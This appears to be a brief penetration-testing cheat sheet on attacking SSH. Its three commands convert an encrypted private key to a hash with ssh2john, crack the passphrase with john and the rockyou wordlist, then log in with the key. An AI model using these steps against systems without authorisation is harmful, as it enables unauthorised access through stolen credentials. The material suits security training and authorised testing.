### Attacking SSH

**Linux Remote Access: SSH, Rsync, and R-Services**

```bash
ssh2john id_rsa > id_rsa.hash             # convert the encrypted key to a crackable hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash   # recover the passphrase
ssh -i id_rsa user@<IP>                   # now unlock the key with the cracked passphrase
```
